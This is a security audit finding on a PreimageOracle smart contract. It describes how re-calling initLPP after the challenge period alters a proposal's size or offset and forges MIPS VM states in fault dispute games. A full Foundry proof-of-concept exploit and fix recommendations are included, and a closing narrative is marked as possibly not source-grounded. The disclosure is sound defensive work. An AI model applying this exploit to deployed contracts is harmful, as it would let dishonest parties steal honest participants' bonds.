---
id: 21756
severity: "High"
---

# LPP metadata can be altered after the challenge period is over, allowing incorrect states to be proven

## Description

It was reported [in the Spearbit review (5.2.5 “Preimage proposals can be initialized multiple times”)](https://github.com/spearbit/portfolio/blob/35e01e225519242589ab83f6fad100db892bcfe9/pdfs/Spearbit-Coinbase-Security-Review-June-2024.pdf) that it is possible to re-initialize LPPs, at a loss for the caller, because the `initLPP` function doesn’t check for the LPP to exist already.

If we look at the `initLPP()` function, however, we can see that there is another vulnerability that can be chained: at L431, the to-be-initialized `LPPMetadata` is unnecessarily read from storage instead of being initialized empty:

```solidity
    File: PreimageOracle.sol
    417:     function initLPP(uint256 _uuid, uint32 _partOffset, uint32 _claimedSize) external payable {
    418:         // The bond provided must be at least `MIN_BOND_SIZE`.
    419:         if (msg.value < MIN_BOND_SIZE) revert InsufficientBond();
    420: 
    421:         // The caller of `addLeavesLPP` must be an EOA, so that the call inputs are always available in block bodies.
    422:         if (msg.sender != tx.origin) revert NotEOA();
    423: 
    424:         // The part offset must be within the bounds of the claimed size + 8.
    425:         if (_partOffset >= _claimedSize + 8) revert PartOffsetOOB();
    426: 
    427:         // The claimed size must be at least `MIN_LPP_SIZE_BYTES`.
    428:         if (_claimedSize < MIN_LPP_SIZE_BYTES) revert InvalidInputSize();
    429: 
    430:         // Initialize the proposal metadata.
    431:         LPPMetaData metaData = proposalMetadata[msg.sender][_uuid];
    432:         proposalMetadata[msg.sender][_uuid] = metaData.setPartOffset(_partOffset).setClaimedSize(_claimedSize);
    433:         proposals.push(LargePreimageProposalKeys(msg.sender, _uuid));
    434: 
    435:         // Assign the bond to the proposal.
    436:         proposalBonds[msg.sender][_uuid] = msg.value;
    437:     }
```

Because of this, L431 and L432 in fact allow to arbitrarily change an existing LPP’s `partOffset` and `claimedSize` metadata, while leaving unchanged its other metadata, including its finalization `timestamp` if set.

Additionally, `squeezeLPP()` does not check that `bytesProcessed == claimedSize` since this check is already performed on finalization in `addLeavesLPP()`.

By exploiting these three issues, it is then possible that:

  * An LPP is first created and populated using correct data.
  * It is finalized, and passes its challenge period.
  * After the challenge period is over, its `claimedSize` is changed to an arbitrary length by calling `initLPP` again.
  * Immediately after (without an opportunity for a challenge to happen), the LPP data is stored in `preimageParts` with a `squeezeLPP()` call along with an incorrect `claimedSize` stored in `preimageLengths`.
  * With the incorrect preimage length, it is possible to trick the MIPS VM to produce an incorrect state by, for example, having the preimage length be less than the part offset + length of data to read which will cause a lesser number of bytes being copied over to memory during a read syscall, thereby producing an incorrect `memRoot` and thus an incorrect state (demonstrated in the coded PoC below).

Similar attacks are also possible by instead (or additionally) altering the `partOffset`, with the same outcome of producing an incorrect `memRoot` leading to an incorrect state hash.

Malicious actors can trick the VM into producing an incorrect state and therefore, allow a dishonest participant to win the fault dispute game, stealing the bonds of honest participants.

## Proof of Concept

```solidity
The following PoC compares side-by-side the outcome of two courses of action: one that is honest, and one that exploits the above-mentioned vulnerabilities to tamper with the preimage lengths. At the end, the test proves that the two courses of action yield a different state of the MIPS VM.

Coded PoC in Foundry
    
        // Add this test to the PreimageOracle_LargePreimageProposals_Test test contract in PreimageOracle.t.sol
        // and import { MIPS } from "src/cannon/MIPS.sol";
        function testAlterLppAfterChallengePeriod() public {
            // We create another oracle to compare outcomes
            PreimageOracle honestOracle = oracle;
            PreimageOracle hackedOracle = new PreimageOracle({ _minProposalSize: MIN_SIZE_BYTES, _challengePeriod: CHALLENGE_PERIOD });
            vm.label(address(hackedOracle), "HackedPreimageOracle");
    
            // Normal lifecycle of an LPP...
            bytes memory data = new bytes(136);
            for (uint256 i; i < data.length; i++) {
                data[i] = bytes1(uint8(i));
            }
    
            honestOracle.initLPP{ value: oracle.MIN_BOND_SIZE() }(TEST_UUID, 132, uint32(data.length));
            hackedOracle.initLPP{ value: oracle.MIN_BOND_SIZE() }(TEST_UUID, 132, uint32(data.length));
    
            LibKeccak.StateMatrix memory stateMatrix;
            bytes32[] memory stateCommitments = _generateStateCommitments(stateMatrix, data);
            honestOracle.addLeavesLPP(TEST_UUID, 0, data, stateCommitments, true);
            hackedOracle.addLeavesLPP(TEST_UUID, 0, data, stateCommitments, true);
    
            LibKeccak.StateMatrix memory matrix;
            PreimageOracle.Leaf[] memory leaves = _generateLeaves(matrix, data);
    
            bytes32[] memory preProof = new bytes32[](16);
            preProof[0] = _hashLeaf(leaves[1]);
            bytes32[] memory postProof = new bytes32[](16);
            postProof[0] = _hashLeaf(leaves[0]);
            for (uint256 i = 1; i < preProof.length; i++) {
                bytes32 zeroHash = oracle.zeroHashes(i);
                preProof[i] = zeroHash;
                postProof[i] = zeroHash;
            }
    
            // The proposal is honest on both oracles up to here, so it can only go unchallenged
            vm.warp(block.timestamp + oracle.challengePeriod() + 1 seconds);
    
            // ... up to here.
    
            // ☢️ challenge period is over, now we can alter the part to have an arbitrary length
            // and promote it immediately
            hackedOracle.initLPP{ value: oracle.MIN_BOND_SIZE() }(TEST_UUID, 132, 125);
    
            // Finalize the proposal.
            honestOracle.squeezeLPP({
                _claimant: address(this),
                _uuid: TEST_UUID,
                _stateMatrix: _stateMatrixAtBlockIndex(data, 1),
                _preState: leaves[0],
                _preStateProof: preProof,
                _postState: leaves[1],
                _postStateProof: postProof
            });
            hackedOracle.squeezeLPP({
                _claimant: address(this),
                _uuid: TEST_UUID,
                _stateMatrix: _stateMatrixAtBlockIndex(data, 1),
                _preState: leaves[0],
                _preStateProof: preProof,
                _postState: leaves[1],
                _postStateProof: postProof
            });
    
            bytes32 finalDigest = _setStatusByte(keccak256(data), 2);
    
            // The key of the data is the same:
            assertTrue(honestOracle.preimagePartOk(finalDigest, 132));
            assertTrue(hackedOracle.preimagePartOk(finalDigest, 132));
    
            // 🚨 However, the part has been altered in its length...
            assertEq(honestOracle.preimageLengths(finalDigest), 136);
            assertEq(hackedOracle.preimageLengths(finalDigest), 125);
    
            (, uint256 datLen) = honestOracle.readPreimage(finalDigest, 132);
            (, uint256 hDatLen) = hackedOracle.readPreimage(finalDigest, 132);
            
            assertNotEq(datLen, hDatLen);
    
            // And the MIPS state machine behavior is 
            // consequently altered when reading at this key
            // (this setup is inspired by "test_preimage_read_succeeds")
            MIPS honestMips = new MIPS(honestOracle);
            MIPS hackedMips = new MIPS(hackedOracle);
    
            uint32 pc = 0x0;
            uint32 insn = 0x0000000c; // syscall
            uint32 a1 = 0x4;
            uint32 a1_val = 0x0000abba;
            bytes32 memRoot = 0xcdeeb321c3368b44bb49df936a17fc933160e1581a00a3058e1d5e034ca57443;
            bytes memory proof = hex"0000000c0000abba0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ad3228b676f7d3cd4284a5443f17f1962b36e491b30a40b2405849e597ba5fb5b4c11951957c6f8f642c4af61cd6b24640fec6dc7fc607ee8206a99e92410d3021ddb9a356815c3fac1026b6dec5df3124afbadb485c9ba5a3e3398a04b7ba85e58769b32a1beaf1ea27375a44095a0d1fb664ce2dd358e7fcbfb78c26a193440eb01ebfc9ed27500cd4dfc979272d1f0913cc9f66540d7e8005811109e1cf2d887c22bd8750d34016ac3c66b5ff102dacdd73f6b014e710b51e8022af9a1968ffd70157e48063fc33c97a050f7f640233bf646cc98d9524c6b92bcf3ab56f839867cc5f7f196b93bae1e27e6320742445d290f2263827498b54fec539f756afcefad4e508c098b9a7e1d8feb19955fb02ba9675585078710969d3440f5054e0f9dc3e7fe016e050eff260334f18a5d4fe391d82092319f5964f2e2eb7c1c3a5f8b13a49e282f609c317a833fb8d976d11517c571d1221a265d25af778ecf8923490c6ceeb450aecdc82e28293031d10c7d73bf85e57bf041a97360aa2c5d99cc1df82d9c4b87413eae2ef048f94b4d3554cea73d92b0f7af96e0271c691e2bb5c67add7c6caf302256adedf7ab114da0acfe870d449a3a489f781d659e8beccda7bce9f4e8618b6bd2f4132ce798cdc7a60e7e1460a7299e3c6342a579626d22733e50f526ec2fa19a22b31e8ed50f23cd1fdf94c9154ed3a7609a2f1ff981fe1d3b5c807b281e4683cc6d6315cf95b9ade8641defcb32372f1c126e398ef7a5a2dce0a8a7f68bb74560f8f71837c2c2ebbcbf7fffb42ae1896f13f7c7479a0b46a28b6f55540f89444f63de0378e3d121be09e06cc9ded1c20e65876d36aa0c65e9645644786b620e2dd2ad648ddfcbf4a7e5b1a3a4ecfe7f64667a3f0b7e2f4418588ed35a2458cffeb39b93d26f18d2ab13bdce6aee58e7b99359ec2dfd95a9c16dc00d6ef18b7933a6f8dc65ccb55667138776f7dea101070dc8796e3774df84f40ae0c8229d0d6069e5c8f39a7c299677a09d367fc7b05e3bc380ee652cdc72595f74c7b1043d0e1ffbab734648c838dfb0527d971b602bc216c9619ef0abf5ac974a1ed57f4050aa510dd9c74f508277b39d7973bb2dfccc5eeb0618db8cd74046ff337f0a7bf2c8e03e10f642c1886798d71806ab1e888d9e5ee87d00000000c0000abba0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ad3228b676f7d3cd4284a5443f17f1962b36e491b30a40b2405849e597ba5fb5b4c11951957c6f8f642c4af61cd6b24640fec6dc7fc607ee8206a99e92410d3021ddb9a356815c3fac1026b6dec5df3124afbadb485c9ba5a3e3398a04b7ba85e58769b32a1beaf1ea27375a44095a0d1fb664ce2dd358e7fcbfb78c26a193440eb01ebfc9ed27500cd4dfc979272d1f0913cc9f66540d7e8005811109e1cf2d887c22bd8750d34016ac3c66b5ff102dacdd73f6b014e710b51e8022af9a1968ffd70157e48063fc33c97a050f7f640233bf646cc98d9524c6b92bcf3ab56f839867cc5f7f196b93bae1e27e6320742445d290f2263827498b54fec539f756afcefad4e508c098b9a7e1d8feb19955fb02ba9675585078710969d3440f5054e0f9dc3e7fe016e050eff260334f18a5d4fe391d82092319f5964f2e2eb7c1c3a5f8b13a49e282f609c317a833fb8d976d11517c571d1221a265d25af778ecf8923490c6ceeb450aecdc82e28293031d10c7d73bf85e57bf041a97360aa2c5d99cc1df82d9c4b87413eae2ef048f94b4d3554cea73d92b0f7af96e0271c691e2bb5c67add7c6caf302256adedf7ab114da0acfe870d449a3a489f781d659e8beccda7bce9f4e8618b6bd2f4132ce798cdc7a60e7e1460a7299e3c6342a579626d22733e50f526ec2fa19a22b31e8ed50f23cd1fdf94c9154ed3a7609a2f1ff981fe1d3b5c807b281e4683cc6d6315cf95b9ade8641defcb32372f1c126e398ef7a5a2dce0a8a7f68bb74560f8f71837c2c2ebbcbf7fffb42ae1896f13f7c7479a0b46a28b6f55540f89444f63de0378e3d121be09e06cc9ded1c20e65876d36aa0c65e9645644786b620e2dd2ad648ddfcbf4a7e5b1a3a4ecfe7f64667a3f0b7e2f4418588ed35a2458cffeb39b93d26f18d2ab13bdce6aee58e7b99359ec2dfd95a9c16dc00d6ef18b7933a6f8dc65ccb55667138776f7dea101070dc8796e3774df84f40ae0c8229d0d6069e5c8f39a7c299677a09d367fc7b05e3bc380ee652cdc72595f74c7b1043d0e1ffbab734648c838dfb0527d971b602bc216c9619ef0abf5ac974a1ed57f4050aa510dd9c74f508277b39d7973bb2dfccc5eeb0618db8cd74046ff337f0a7bf2c8e03e10f642c1886798d71806ab1e888d9e5ee87d0";
    
            uint32[32] memory registers;
            registers[2] = 4003; // read syscall
            registers[4] = 5; // fd
            registers[5] = a1; // addr
            registers[6] = 4; // count
    
            MIPS.State memory state = MIPS.State({
                memRoot: memRoot,
                preimageKey: finalDigest,
                preimageOffset: 132, // start reading past the pre-image length prefix
                pc: pc,
                nextPC: pc + 4,
                lo: 0,
                hi: 0,
                heap: 0,
                exitCode: 0,
                exited: false,
                step: 1,
                registers: registers
            });
            
            bytes memory encodedRegisters;
            for (uint256 i = 0; i < state.registers.length; i++) {
                encodedRegisters = bytes.concat(encodedRegisters, abi.encodePacked(state.registers[i]));
            }
    
            bytes memory encodedState = abi.encodePacked(
                state.memRoot,
                state.preimageKey,
                state.preimageOffset,
                state.pc,
                state.nextPC,
                state.lo,
                state.hi,
                state.heap,
                state.exitCode,
                state.exited,
                state.step,
                encodedRegisters
            );
    
            bytes32 honestPostState = honestMips.step(encodedState, proof, 0);
            bytes32 hackedPostState = hackedMips.step(encodedState, proof, 0);
    
            // 🚨 and this is where a honest participant can lose a dispute
            assertNotEq(honestPostState, hackedPostState);
        }
```

## Recommendation

```solidity
Consider fixing the three issues exploited in the PoC:

  * Do not allow calling `initLPP()` again on proposals with non-zero `proposalMetadata`.
  * Within `initLPP()`, remove the unnecessary storage read at L431.
  * Within `squeezeLPP`, consider introducing a sanity check that `bytesProcessed == claimedSize` as on LPP finalization.
```

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability concerns Large Preimage Proposals (LPP) in the PreimageOracle contract. The initLPP function reads an existing LPPMetaData struct from storage and then overwrites only the partOffset and claimedSize fields without checking whether a proposal with the same UUID already exists. Because the function does not verify that the proposal metadata is empty, an attacker can call initLPP a second time after the proposal has been finalized and the challenge period has elapsed. This second call changes the recorded partOffset or claimedSize while leaving the finalization timestamp untouched. A second weakness is that squeezeLPP does not verify that the number of bytes processed matches the claimedSize, relying on a check that only occurs during addLeavesLPP. By chaining these issues, an attacker can (1) create a correct LPP, (2) let it pass the challenge period, (3) re‑initialize it with a smaller claimedSize or altered partOffset, and (4) immediately call squeezeLPP to store the preimage with the tampered length. The MIPS virtual machine later reads the preimage using the altered length, which can cause it to copy fewer bytes than expected, producing an incorrect memRoot and therefore an incorrect state hash. This incorrect state can be presented in a fault dispute game, allowing a dishonest participant to win the dispute and claim the bonds of honest challengers. The bug is triggered only after the challenge period is over and requires the caller to be an externally owned account that can supply the bond. It is hard to notice because the metadata change does not affect the visible finalization timestamp and only modifies numeric fields, so the proposal appears unchanged at a glance. The issue was discovered during a security review (Spearbit) and reproduced with a Foundry proof‑of‑concept that shows divergent MIPS post‑states for honest and tampered proposals. To remediate, initLPP should reject calls when proposalMetadata for the given UUID is already populated, it should initialize a fresh empty metadata struct instead of reading from storage, and squeezeLPP should include a sanity check that bytesProcessed equals the claimedSize, mirroring the validation performed at finalization. Fixing these checks restores the integrity of preimage length accounting and prevents the creation of false states that could be used to steal bonds.
